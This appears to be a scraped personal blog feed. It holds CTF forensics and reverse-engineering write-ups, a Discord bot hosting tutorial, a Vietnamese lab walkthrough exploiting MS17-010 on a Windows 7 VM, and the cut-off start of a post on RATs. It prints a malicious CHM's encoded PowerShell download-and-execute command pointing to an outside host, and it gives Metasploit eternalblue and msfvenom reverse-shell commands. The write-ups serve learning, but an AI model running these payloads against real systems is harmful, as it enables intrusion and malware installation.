Telekinetic Warfare In this challenge, we obtained a GIF file where each frame of the GIF represents a QR code. I wrote a script to separate the QR codes and decode them simultaneously.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 import os import glob from PIL import Image from pyzbar.pyzbar import decode # Replace \u0026#39;path/to/folder\u0026#39; with the actual path to the folder containing the QR codes folder_path = \u0026#39;qrcodes/\u0026#39; output_file = \u0026#39;qr_codes.txt\u0026#39; # Create a list of all the image files in the folder image_files = glob.glob(os.path.join(folder_path, \u0026#39;*.jpg\u0026#39;)) # Open the output file for writing with open(output_file, \u0026#39;w\u0026#39;) as f: # Loop over each image file in the folder for image_file in image_files: # Open the image and decode the QR code image = Image.open(image_file) qr_code = decode(image) # If a QR code was detected, write the URL to the output file if qr_code: url = qr_code[0].data.decode() f.write(url + \u0026#39;\\n\u0026#39;) After running the script, we obtained a bunch of base64 strings, which were then converted into a PDF file. You can view the decoded flag in the decode flag.\nUMDCTF{wh0_n33d5_k1net1c_w4rfar3_anyw4ys}\nDoctors hate him!! Based on the Malware Chall Disclaimer challenge, we can infer that this challenge is related to malware (perhaps reverse malware?). little timmy and i spent the whole night reversing the file that we suspected to be malicious, and the ending was truly unforgettable.\nIn this challenge, I received a chm file. According to my research, it is a Compiled HTML Help file. I tried opening it with Microsoft Help, but didn\u0026rsquo;t find much\u0026hellip; (except for a button that didn\u0026rsquo;t do anything).\nBased on this button, I think it might have originally been a web page\u0026hellip;\nI used the HelpSmith tool and obtained the following zip file.\nYes, it does contain a real web page\u0026hellip; now it\u0026rsquo;s more accurate.\nIn the source code of the web page, there is a base64-encoded string: VU1EQ1RGezE5OTdfY2FsbGVkXw==.\n\u0026ndash;\u0026gt; UMDCTF{1997_called_\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 \u0026lt;PARAM name=\u0026#34;Item1\u0026#34; value=\u0026#39;,cmd.exe,/c powershell.exe -ExecutionPolicy Bypass -NoLogo -NoProfile -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AZABuAHMALQBzAGUAcgB2AGUAcgAuAG8AbgBsAGkAbgBlADoANgA5ADYAOQAvAGUAeABwAGwAbwByAGUALgBlAHgAZQAgAC0ATwB1AHQARgBpAGwAZQAgAGUAeABwAGwAbwByAGUALgBlAHgAZQA7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGUAeABwAGwAbwByAGUALgBlAHgAZQA7ACAAPQAnAGcAdQByAGwAXwBqAG4AYQBnAF8AZwB1AHIAdgBlACcA\u0026#39;\u0026gt; \u0026lt;body\u0026gt; \u0026lt;!--VU1EQ1RGezE5OTdfY2FsbGVkXw==--\u0026gt; \u0026lt;OBJECT id=shortcut classid=\u0026#34;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11\u0026#34; width=1 height=1\u0026gt; \u0026lt;PARAM name=\u0026#34;Command\u0026#34; value=\u0026#34;ShortCut\u0026#34;\u0026gt; \u0026lt;PARAM name=\u0026#34;Button\u0026#34; value=\u0026#34;Bitmap::shortcut\u0026#34;\u0026gt; \u0026lt;PARAM name=\u0026#34;Item1\u0026#34; value=\u0026#39;,cmd.exe,/c powershell.exe -ExecutionPolicy Bypass -NoLogo -NoProfile -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AZABuAHMALQBzAGUAcgB2AGUAcgAuAG8AbgBsAGkAbgBlADoANgA5ADYAOQAvAGUAeABwAGwAbwByAGUALgBlAHgAZQAgAC0ATwB1AHQARgBpAGwAZQAgAGUAeABwAGwAbwByAGUALgBlAHgAZQA7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGUAeABwAGwAbwByAGUALgBlAHgAZQA7ACAAPQAnAGcAdQByAGwAXwBqAG4AYQBnAF8AZwB1AHIAdgBlACcA\u0026#39;\u0026gt; \u0026lt;PARAM name=\u0026#34;Item2\u0026#34; value=\u0026#34;273,1,1\u0026#34;\u0026gt; \u0026lt;/OBJECT\u0026gt; \u0026lt;SCRIPT\u0026gt; shortcut.Click(); \u0026lt;/SCRIPT\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;text\u0026#34;\u0026gt; \u0026lt;strong\u0026gt; \u0026lt;h1\u0026gt;DOCTORS HATE HIM!!\u0026lt;/h1\u0026gt; \u0026lt;/strong\u0026gt; \u0026lt;p\u0026gt;Do you suffer from low energy, fatigue, and a general lack of motivation? Did your Pokemon leave you for a better trainer? Rocket Corp\u0026#39;s Master Ball Serum can help! Our all-natural formula boosts your energy levels and helps you feel like a young trainer ready to take on the world again!\u0026lt;/p\u0026gt;\u0026lt;button\u0026gt;Find out more!\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;image\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;depressed_pokemon_trainer.png\u0026#34; alt=\u0026#34;Pikachu\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; $env:WEB_REQUEST -Uri http://dns-server:6969/explorer.exe -OutFile explorer.exe; Start-Process explorer.exe and\n1 powershell.exe -ExecutionPolicy Bypass -NoLogo -NoProfile -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AZABuAHMALQBzAGUAcgB2AGUAcgAuAG8AbgBsAGkAbgBlADoANgA5ADYAOQAvAGUAeABwAGwAbwByAGUALgBlAHgAZQAgAC0ATwB1AHQARgBpAGwAZQAgAGUAeABwAGwAbwByAGUALgBlAHgAZQA7AA== Decoding the above base64 string yields Invoke-WebRequest -Uri http://dns-server.online:6969/explore.exe -OutFile explore.exe;\nAfterwards, I found another segment.\n1 SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AZABuAHMALQBzAGUAcgB2AGUAcgAuAG8AbgBsAGkAbgBlADoANgA5ADYAOQAvAGUAeABwAGwAbwByAGUALgBlAHgAZQAgAC0ATwB1AHQARgBpAGwAZQAgAGUAeABwAGwAbwByAGUALgBlAHgAZQA7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGUAeABwAGwAbwByAGUALgBlAHgAZQA7ACAAPQAnAGcAdQByAGwAXwBqAG4AYQBnAF8AZwB1AHIAdgBlACcA Decode base64: Invoke-WebRequest -Uri http://dns-server.online:6969/explore.exe -OutFile explore.exe; Start-Process explore.exe; ='gurl_jnag_gurve'\ngurl_jnag_gurve looks quite similar to a flag :)), I used ChatGPT and found out it\u0026rsquo;s ROT13 encoded :))), guessing until death!!!\n\u0026ndash;\u0026gt; they_want_their\nHere comes the one wrong step, one mile astray moment. From those code snippets and the mentioned command, I only interpreted the PowerShell command executing explore.exe in connection with the challenge name Malware Chall Disclaimer. As a result, I misunderstood that I had to dive into researching that malware to trace it down :)), wasting two hours trying to trace and reverse-engineer that explore.exe while also attempting to decipher it before reaching the solution.\nI should have checked the website itself to see if there was anything significant.\nThank goodness! If I hadn\u0026rsquo;t discovered this by accident before the competition was over, I might have given up on forensics altogether.\nUMDCTF{1997_called_they_want_their_malware_back_bozo}\nConclusion In this competition, I think the forensics challenges were not too difficult overall (even the newbie-level could be accessed by around 7 out of 8 tasks). However, some tasks were overly reliant on guessing, which made it a bit frustrating for forensic enthusiasts.\nThanks to Hwi#9932 for helping me identify some misconceptions in the Telekinetic Warfare challenge and to everyone in BKSEC for constantly encouraging me to improve my skills in forensic challenges digital.\n","date":"2023-05-17T00:00:00Z","image":"/p/umdctf-2023-digital-forensics/featured_hu521915a03207d3ded912c6c781e96e24_122168_120x120_fill_box_smart1_3.png","permalink":"/p/umdctf-2023-digital-forensics/","title":"UMDCTF 2023 | Digital Forensics"},{"content":"Microsoft ❤️ Linux Microsoft’s latest addition to the world of Open Source: a flag checker…\nPart 1 analysis Check file \u0026ndash;\u0026gt; elf\ncheck the start function:\nSo easy to see in the loc_100063 stream along with the LINUX system commands, the conclusion is that that the input will be scanned 18 times (1 element each time) then stored in byte_100111, then rol with 0Dh (left shift 13 bits) and compaerd to byte_100210 (in the local)\nCheck byte_100210 (local):\n1 2 3 4 5 6 7 8 9 10 11 00100210 byte_100210 db 6Ch ; DATA XREF: start+1D↑r 00100211 dd offset byte_8E6C4EED 00100215 align 2 00100216 dd offset byte_4CAD666F 0010021A dd offset word_666C864E 0010021E dd offset byte_8E0F6685 00100222 dd offset word_2169633E 00100226 dd offset word_3C79553E 0010022A dd offset byte_3C786A63 0010022E dd offset dword_2C2C6538 00100232 dw 703Ch We can byte_100210: b'l\\xedNl\\x8e\\xccof\\xadLN\\x86lf\\x85f\\x0f\\x8e\u0026gt;ci!\u0026gt;Uy\u0026lt;cjx\u0026lt;8e,,\u0026lt;p'\nNow just write a scipt to find the original flag :333 (reverse the encoding of byte_100210 from the original flag):\nScript part 1 1 2 3 4 5 6 7 8 9 10 from pwn import ror input_data = b\u0026#39;l\\xedNl\\x8e\\xccof\\xadLN\\x86lf\\x85f\\x0f\\x8e\u0026gt;ci!\u0026gt;Uy\u0026lt;cjx\u0026lt;8e,,\u0026lt;p\u0026#39; shifted_data = bytearray() for byte in input_data: shifted_byte = ror(byte, 13, 8) shifted_data.append(shifted_byte) print(shifted_data.decode(\u0026#39;latin-1\u0026#39;)) And what we get is \u0026hellip;\ncorctf{3mbr4c3,3xtñ\\x1bK ñªËá\\x1bSÃáÁ+aaá\nIt seems like i can only get the first half of the flag, which isn\u0026rsquo;t easy by i can input it hix \u0026hellip;\nPart 2 analysis i will carefully check IDA again \u0026amp; see that between function start \u0026amp; byte_100111 along with byte_100210\n1 2 3 4 5 6 7 8 9 001000C2 dd offset dword_168D0AB4 001000C6 dd offset byte_6C60211 001000CA dd offset byte_C6FF0211 001000CE dw 1206h 001000D0 dd offset word_21CDFF02 001000D4 dd 0FE83F631h, 8A117412h, 34021384h, 229C8A0Dh, 75D83803h 001000D4 dd 0EAEB4609h, 33406C7h, 0DB310001h, 3E8309B4h, 74010334h 001000D4 dd 9F168D0Ah, 0B421CD03h, 8D21CD4Ch, 0CD033616h, 0CD4CB421h 00100110 db 21h Switching to reading the code, we get the following\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 001000C2 mov ah, 0Ah 001000C4 lea edx, [esi] 001000C6 adc [edx], eax 001000C8 mov byte ptr [esi], 11h 001000CB add bh, bh 001000CD mov byte ptr [esi], 12h 001000D0 add bh, bh 001000D2 int 21h ; DOS - BUFFERED KEYBOARD INPUT 001000D2 ; DS:DX -\u0026gt; buffer 001000D4 xor esi, esi 001000D6 001000D6 loc_1000D6: ; CODE XREF: 001000EA↓j 001000D6 cmp esi, 12h 001000D9 jz short loc_1000EC 001000DB mov al, [ebx+edx-75F2CBFEh] 001000E2 pushf 001000E3 and al, [ebx] 001000E5 cmp al, bl 001000E7 jnz short loc_1000F2 001000E9 inc esi 001000EA jmp short loc_1000D6 001000EC ; --------------------------------------------------------------------------- 001000EC 001000EC loc_1000EC: ; CODE XREF: 001000D9↑j 001000EC mov dword ptr [esi], 10334h 001000F2 001000F2 loc_1000F2: ; CODE XREF: 001000E7↑j 001000F2 xor ebx, ebx 001000F4 mov ah, 9 001000F6 cmp dword ptr [esi], 34h ; \u0026#39;4\u0026#39; 001000F9 add eax, [ecx] 001000FB jz short near ptr loc_100102+5 001000FD lea edx, [esi] 001000FF lahf 00100100 add ecx, ebp 00100102 00100102 loc_100102: ; CODE XREF: 001000FB↑j 00100102 and [esp+ecx*2+168D21CDh], esi 00100109 db 36h 00100109 add ecx, ebp Combined with assigning 0xd to edx, perhaps this half of the flag will do something with 0xd\nMaybe i though too much (just xor with 0xd)\nflag: corctf{3mbr4c3,3xt3nd,3Xt1ngu15h!!1}\nturbocrab Description: 🚀🚀 blazinglyer faster 🚀🚀 SHA256 hash of the flag: dc136f8bf4ba6cc1b3d2f35708a0b2b55cb32c2deb03bdab1e45fcd1102ae00a\nCheck the file Setup and run file:\nWhen i load turbocrab into IDA64\nLooking at this decompiled rust, I came up with the idea of ​​searching the string from the previous check flag section to find the function 🤡\nfunction turbocrab::execute_shellcode::h6984ce5848b31780:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 void __cdecl turbocrab::execute_shellcode::h6984ce5848b31780(__u8_ shellcode) { __u8_ v1; // rdi __int64 v2; // r15 __int64 v3; // rdx usize v4; // [rsp+8h] [rbp-190h] u8 *v5; // [rsp+10h] [rbp-188h] usize len; // [rsp+20h] [rbp-178h] __int64 count; // [rsp+28h] [rbp-170h] core::ffi::c_void *src; // [rsp+30h] [rbp-168h] core::ffi::c_void *dst; // [rsp+48h] [rbp-150h] _BYTE v10[29]; // [rsp+63h] [rbp-135h] BYREF alloc::vec::Vec\u0026lt;u8,alloc::alloc::Global\u0026gt; self; // [rsp+80h] [rbp-118h] BYREF u8 *v12; // [rsp+98h] [rbp-100h] __int64 v13; // [rsp+A0h] [rbp-F8h] BYREF core::fmt::Arguments v14; // [rsp+A8h] [rbp-F0h] BYREF core::fmt::Arguments v15; // [rsp+D8h] [rbp-C0h] BYREF __u8_ v16; // [rsp+108h] [rbp-90h] core::ffi::c_void *v17; // [rsp+118h] [rbp-80h] __int64 *v18; // [rsp+130h] [rbp-68h] __int64 v19; // [rsp+138h] [rbp-60h] __int64 v20; // [rsp+140h] [rbp-58h] __int64 v21; // [rsp+148h] [rbp-50h] core::ffi::c_void *v22; // [rsp+150h] [rbp-48h] core::ffi::c_void *v23; // [rsp+158h] [rbp-40h] __int64 v24; // [rsp+160h] [rbp-38h] __int64 v25; // [rsp+168h] [rbp-30h] u8 *v26; // [rsp+170h] [rbp-28h] __int64 v27; // [rsp+178h] [rbp-20h] u8 *v28; // [rsp+180h] [rbp-18h] v16 = shellcode; v25 = 0LL; dst = mmap(0LL, shellcode.length, 3, 33, -1, 0LL); v17 = dst; qmemcpy(v10, \u0026#34;R^CRIWJM\u0026lt;6.[5I.G`.C3G3CB5_V?P\u0026#34;, sizeof(v10)); alloc::vec::from_elem::hba0d51ad3cb1207d(\u0026amp;self, 0, 0x4000uLL); v26 = alloc::vec::Vec$LT$T$C$A$GT$::as_ptr::h0252951c7d91d004(\u0026amp;self); v27 = 49602LL; v28 = v26 + 49602; v12 = v26 + 49602; src = core::slice::_$LT$impl$u20$$u5b$T$u5d$$GT$::as_ptr::h869fdf96852d8c48(shellcode); count = core::slice::_$LT$impl$u20$$u5b$T$u5d$$GT$::len::h00af0a2d7a9c0658(shellcode); v22 = dst; v23 = src; v24 = count; core::intrinsics::copy::h46e3e522e297e890(src, dst, count); len = core::slice::_$LT$impl$u20$$u5b$T$u5d$$GT$::len::h00af0a2d7a9c0658(shellcode); mprotect(dst, len, 5); v13 = v20; v18 = \u0026amp;v13; v1.data_ptr = v10; v1.length = 29LL; v5 = core::slice::_$LT$impl$u20$$u5b$T$u5d$$GT$::as_ptr::h869fdf96852d8c48(v1); v1.data_ptr = v10; v1.length = 29LL; v4 = core::slice::_$LT$impl$u20$$u5b$T$u5d$$GT$::len::h00af0a2d7a9c0658(v1); v2 = v12; v13 = (dst)(v10, 29LL, v3, dst, v5, v4); v12 = v2; v19 = v13; v21 = v13; if ( v13 == 1 ) core::fmt::Arguments::new_v1::h610d7aa66ccb1a0c(\u0026amp;v14, __PAIR128__(1LL, \u0026amp;stru_5620902FFF78), \u0026amp;stru_562090296240); else core::fmt::Arguments::new_v1::h610d7aa66ccb1a0c(\u0026amp;v15, __PAIR128__(1LL, \u0026amp;stru_5620902FFF68), \u0026amp;stru_562090296240); std::io::stdio::_print::hccc6c4adfff98fee(); core::ptr::drop_in_place$LT$alloc..vec..Vec$LT$u8$GT$$GT$::h34608ea8b4b90afb(\u0026amp;self); } My conclusion here is:\nR^CRIWJM\u0026lt;6.[5I.G`.C3G3CB5_V?P looks like it\u0026rsquo;s been encrypted\nshellcode and source dst are unknown v13 == 1 --\u0026gt; Correct! and vice versa\nDebugging Setup virtual machine for debugging with breakpoint set at v13 = (dst)(v10, 29LL, v3, dst, v5, v4);\nStep into continuously and when it comes to call close ptr unk_7F8C04CC62B2 there is a section LINUX-sys_read \u0026ndash;\u0026gt; Interrupt for input, we will see the section after that will have the input you entered and also the local encoding flag\nContinue and understand that the flow of the program is xor with 13 then sub with 1Eh (each character) like the asm fragment below:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 zero:00007FE17840D120 loc_7FE17840D120: ; CODE XREF: zero:00007FE17840D06F↑j zero:00007FE17840D120 mov rax, r9 zero:00007FE17840D123 xor rax, r9 zero:00007FE17840D126 mov r9, rax zero:00007FE17840D129 mov al, [r8] zero:00007FE17840D12C mov r9b, al zero:00007FE17840D12F mov al, r9b zero:00007FE17840D132 xor al, 13h zero:00007FE17840D134 mov r9b, al zero:00007FE17840D137 pushfq zero:00007FE17840D138 mov al, r9b zero:00007FE17840D13B mov rbx, rax zero:00007FE17840D13E mov al, 80h zero:00007FE17840D140 mov rcx, 2 zero:00007FE17840D14A cmp rbx, rax zero:00007FE17840D14D jz short loc_7FE17840D158 zero:00007FE17840D14F sbb rcx, rcx zero:00007FE17840D152 and ecx, 0FFFFFFFDh zero:00007FE17840D155 add ecx, 4 zero:00007FE17840D158 zero:00007FE17840D158 loc_7FE17840D158: ; CODE XREF: zero:00007FE17840D14D↑j zero:00007FE17840D158 mov r14, rcx zero:00007FE17840D15B popfq zero:00007FE17840D15C mov rax, r14 zero:00007FE17840D15F and al, 4 zero:00007FE17840D161 test al, al zero:00007FE17840D163 jz short loc_7FE17840D16D zero:00007FE17840D165 mov al, r9b zero:00007FE17840D168 xor al, 37h zero:00007FE17840D16A mov r9b, al zero:00007FE17840D16D zero:00007FE17840D16D loc_7FE17840D16D: ; CODE XREF: zero:00007FE17840D163↑j zero:00007FE17840D16D mov al, r9b zero:00007FE17840D170 sub al, 1Eh zero:00007FE17840D172 mov r9b, al zero:00007FE17840D175 pushfq zero:00007FE17840D176 mov al, r9b zero:00007FE17840D179 mov rbx, rax zero:00007FE17840D17C mov al, 10h zero:00007FE17840D17E mov rcx, 2 zero:00007FE17840D188 cmp rbx, rax zero:00007FE17840D18B jz short loc_7FE17840D196 zero:00007FE17840D18D sbb rcx, rcx zero:00007FE17840D190 and ecx, 0FFFFFFFDh zero:00007FE17840D193 add ecx, 4 zero:00007FE17840D196 zero:00007FE17840D196 loc_7FE17840D196: ; CODE XREF: zero:00007FE17840D18B↑j zero:00007FE17840D196 mov r14, rcx zero:00007FE17840D199 popfq zero:00007FE17840D19A mov rax, r14 zero:00007FE17840D19D and al, 3 zero:00007FE17840D19F test al, al zero:00007FE17840D1A1 jz short loc_7FE17840D1AB zero:00007FE17840D1A3 mov al, r9b zero:00007FE17840D1A6 xor al, 31h zero:00007FE17840D1A8 mov r9b, al zero:00007FE17840D1AB zero:00007FE17840D1AB loc_7FE17840D1AB: ; CODE XREF: zero:00007FE17840D1A1↑j zero:00007FE17840D1AB mov al, r9b zero:00007FE17840D1AE mov [r8], al zero:00007FE17840D1B1 mov rax, [r15] zero:00007FE17840D1B4 add r15, 8 zero:00007FE17840D1B8 jmp rax Solve Script 1 2 3 encrypt = b\u0026#34;R^CRIWJM\u0026lt;6.[5I.G`.C3G3CB5_V?P\u0026#34; for i in encrypt: print(chr((i + 0x1e) ^ 0x13), end = \u0026#34;\u0026#34;) \u0026ndash;\u0026gt; corctf{xIG_j@t_vm_rBvBrs@ngN}\nIt seems that the flag still has no meaning, but now I notice the sha256 part in the Description: dc136f8bf4ba6cc1b3d2f35708a0b2b55cb32c2deb03bdab1e45fcd1102ae00a\nI can only think of one direction: bruteforce until the two sha256 codes are the same, then initial flag with some identifiable characteristics to save time such as: B can be 3, e or E and @ can be 1, i, I or !.\nBased on those, we can write a script to get the flag:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import hashlib target_hash = \u0026#34;dc136f8bf4ba6cc1b3d2f35708a0b2b55cb32c2deb03bdab1e45fcd1102ae00a\u0026#34; characters = \u0026#34;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,.!?;:\u0026#39;-()[]{}\u0026lt;\u0026gt;\\/@#$%^\u0026amp;*_+=\u0026#34; guess1 = [\u0026#34;1\u0026#34;, \u0026#34;i\u0026#34;, \u0026#34;I\u0026#34;, \u0026#34;!\u0026#34;] guess2 = [\u0026#34;3\u0026#34;, \u0026#34;e\u0026#34;, \u0026#34;E\u0026#34;] for i in range(len(characters)): for j in range(len(characters)): for k in range(len(guess1)): for l in range(len(guess2)): for m in range(len(characters)): candidate = f\u0026#34;corctf{{x{characters[i]}{characters[j]}_j{guess1[k]}t_vm_r{guess2[l]}v{guess2[l]}rs{guess1[k]}ng{characters[m]}}}\u0026#34; hashed = hashlib.sha256(candidate.encode(\u0026#39;utf-8\u0026#39;)).hexdigest() if hashed == target_hash: print(\u0026#34;Found:\u0026#34;, candidate) break flag:corctf{x86_j1t_vm_r3v3rs1ng?}\n","date":"2022-08-09T00:00:00Z","image":"/p/corctf-2022-reverse-engineering/featured-image_huc527355a429b7d0660ac9e16fd98331c_24593_120x120_fill_box_smart1_3.png","permalink":"/p/corctf-2022-reverse-engineering/","title":"CorCTF 2022 | Reverse Engineering"},{"content":"Create Bot Discord \u0026amp; basic config Use DEVELOPER PORTAL to create Bot We can use DEVELOPER PORTAL during the process of creating and using the Bot\nSelect New Application to create a completely new Discord Bot\nAfter successfully creating the Bot, the next step is to configure the Bot to run normally\nToken Bot Instructions: Bot -\u0026gt; Reset Token In addition to basic operations such as changing the name of the Bot, changing the avatar of the Bot,\u0026hellip; there is also a notable item is Token (click on Reset Token to display Token for first use)\nCode base for Discord Bot Main code The main python code will look like this (basic for the Bot to work properly)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 import discord from discord.ext import commands Bot = commands.Bot(command_prefix=\u0026#34;/\u0026#34;, description=description, intents=intents) @Bot.event async def on_ready(): print(f\u0026#39;Bot is ready. Log in as: {Bot.user.name}\u0026#39;) @Bot.command() async def xinchao(ctx): await ctx.send(\u0026#39;Hello!\u0026#39;) Bot.run(\u0026#39;YOUR_TOKEN\u0026#39;) Name this code main.py for the system that uses it\nNote: YOUR_TOKEN is the Token you just received above\nKeep Alive In order for the Bot to work and check that it works, you need to ping it so that the Bot server can run normally\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 from flask import Flask from threading import Thread app = Flask(\u0026#39;\u0026#39;) @app.route(\u0026#39;/\u0026#39;) def home(): return \u0026#34;ping me every time!!!\u0026#34; def run(): app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=8080) def keep_alive(): t = Thread(target=run) t.start() Name the code keep_alive.py along with the directory containing main.py\nAfter you have wrote the keep_alive.py code, you need to integrate it with main.py so that when you run main.py it will also run.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 import discord from discord.ext import commands from keep_alive import keep_alive keep_alive() Bot = commands.Bot(command_prefix=\u0026#34;/\u0026#34;, description=description, intents=intents) @Bot.event async def on_ready(): print(f\u0026#39;Bot is ready. Log in as: {Bot.user.name}\u0026#39;) @Bot.command() async def xinchao(ctx): await ctx.send(\u0026#39;Hello!\u0026#39;) Bot.run(\u0026#39;YOUR_TOKEN\u0026#39;) Host Bot on Replit Let\u0026rsquo;s talk a little bit about Replit, this is a very good online IDE that supports many programming languages ​​(I often use python here for the purpose of being able to install libs). specific to CTF without error). So if you can host a Bot on your computer, you can also host it on Replit\nHosting Bot is extremely easy by just putting the last 2 python files onto Replit and running it\nAfter Run on Replit, you can run the Bot normally, but there is a disadvantage of Replit: after 5 minutes, if no user accesses and uses it, it will automatically shut down, that\u0026rsquo;s why we Need more tools to be able to ping Bot continuously\nKeep Bot \u0026ldquo;awake\u0026rdquo; with Uptime RoBot Uptime RoBot through the keep_alive.py file set up above helps check if the Bot is active and will ping it to replit to revive it so that it can be revived. Hang Bot 24/7 without fear of death.\nExample with uptime statistics of my old Bot (Since 2710 hrs, 23 mins (2023-06-09 17:46:19))\nTutorial: Select + Monitor to create a new Monitor In Monitor Information \u0026ndash;\u0026gt; Monitor Type select HTTP(s) Name and add the URL of Project Replit (it will look like https://.repl.co) Set Monitoring Interval to every 5 minutes (in accordance with Replit) Select Create Monitor and the setup is complete Uptime RoBot will now have the task of pinging the Bot every 5 minutes, which is a lot of fun (unless you force it to do too much work with a free tool :3)\nConclusion This article was posted because my Bot was reported, forcing me to re-create a new Bot, so I\u0026rsquo;ll have to read it again later\nRemember to always respect Discord\u0026rsquo;s Terms of Service when running a bot so you don\u0026rsquo;t get banned like me\n","date":"2022-01-30T00:00:00Z","image":"/p/build-bot-discord-24/7-with-replit-and-uptime-robot-python/featured_hud00ea637fa08c187ca2cd6f368360648_31275_120x120_fill_box_smart1_3.png","permalink":"/p/build-bot-discord-24/7-with-replit-and-uptime-robot-python/","title":"Build Bot Discord 24/7 with Replit and Uptime RoBot (Python)"},{"content":"Tìm hiểu và thực hành tấn công với lỗ hổng MS17-010 (CVE-2017-0143)\nPhát hiện lỗ hổng MS17-010 1 2 Attacker: Kali Linux (192.168.47.128) Victim: Windows 7 (192.168.47.136) Trên máy victim ping tới IP attacker (192.168.47.128) và tương tự trên máy attacker cũng ping tới IP victim (192.168.47.136)\nTrên máy Attacker, sử dụng lệnh sudo nmap -sV -sC -O 192.168.47.136 để check các port đang mở trên máy victim cũng như dịch vụ và script trên các port này\nTại đây thấy port 445 đang mở (cổng 445 được dùng cho dịch vụ Server Message Block - smb truyền qua TCP)\nHoàn toàn có thể thấy script result bao gồm smb-os-discovery\n\u0026ndash;\u0026gt; Scan lỗ hổng trên giao thứ smb (tại port 445) bằng nmap: nmap --script vuln -p 445 192.168.47.136\nHoặc có thể sử dụng lệnh nmap -vv -Pn -T4 --script vuln 192.168.47.136 để quét full các cổng đang mở luôn cũng được\n(T: tượng trưng cho tốc độ quét \u0026ndash;\u0026gt; có 6 mốc quét từ 0 đến 5\n1 paranoid; sneaky; polite, nomal, aggressive, insane \u0026ndash;\u0026gt; tốc độ càng thấp độ an toàn càng cao, mức 3 sẽ là bthg, thi CTF dùng mức 4, thực tế dùng mức 1 (tránh bị hệ thống IDS phát hiện))\nIDS: Instrusion Detection System (Hệ thống phát hiện xâm nhập)\nTừ những dữ liệu trên, ta hoàn toàn có thể xác định được tồn tại lỗ hổng bảo mật MS17-010\nKhai thác lỗ hổng bảo mật MS17-010 Thực hiện truy cập vào máy victim Thực hiện mở Metasploit Framework và search ms17 để tìm các module liên quan\nexploit/windows/smb/ms17_010_eternalblue\nSau khi set module và rhost (remote), run để thiết lập SMB\nuse 0 \u0026ndash;\u0026gt; set rhost 192.168.47.136 (remote) \u0026ndash;\u0026gt; run\nĐến đây là đã khai thác thành công lỗ hổng MS17-010 để truy cập vào máy victim\nTruyền RAT Cách tạo ra 1 phần mềm RAT thì không khác gì như bài RAT (Remote Access Trojan) gì lắm, chỉ cần để ý hệ điêu hành chúng ta sử dụng làm victim trong chủ đề này là Windows 7 (x64) thì chúng ta cần tạo ra 1 file RAT tương ứng x64\nmsfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 lhost=192.168.199.139 lport=4444 -f exe --platform window \u0026gt; mal.exe Truyền RAT qua máy victim bằng lệnh upload + file\nSử dụng lệnh execute -f mal.exe -i -H để chạy file trên máy victim\nhoặc có thể truy cập vào shell và gọi file để chạy\nCheck trong Task Manager để thấy file mal.exe đang chạy\nKết luận Lỗ hổng bảo mật MS17-010 (CVE-2017-010) được đánh giá ở mức độ Critical (Nguy kịch) vì hoàn toàn có thể thực thi từ xa\nHệ điều hành bị ảnh hưởng bởi lỗ hổng bảo mật MS17-010 Windows Vista, Windows Server 2008, Windows 7, Windows Server 2008 R2, Windows 8.1, Windows Server 2012, 2012 R2, Windows RT 8.1, Windows 10, Windows Server 2016\n","date":"2021-12-12T00:00:00Z","image":"/p/ms17-010-cve-2017-0143/featured-image_hu69e7e51dfaf03e795a7783d1f5e83771_247169_120x120_fill_box_smart1_3.png","permalink":"/p/ms17-010-cve-2017-0143/","title":"MS17-010 (CVE-2017-0143)"},{"content":"Tìm hiểu và thực hành tấn công với Remote Access Trojan\nRAT là gì? RAT (Remote Access Trojan) là một loại phần mềm độc hại có thể giúp 1 tin tặc có thể chiếm quyền vào các điện thoại hoặc máy tính khi bị lây nhiễm.\nRAT được sử dụng hầu hết cho việc hack của các tin tặc và được cài trên máy của nạn nhân (victim). Nếu được mã hoá thì RAT sẽ được ẩn đi và rất khó cho các phần mềm diệt virus phát hiện được chúng. Bởi vì vậy càng khiến việc loại bỏ trở nên khó khăn cũng như các tin tặc dễ dàng kiểm soát thiết bị của nạn nhân hơn.\nCác phần mềm RAT nguy hiểm ở chỗ, hiện nay nó đang được rao bán với tầm giá từ vài chục 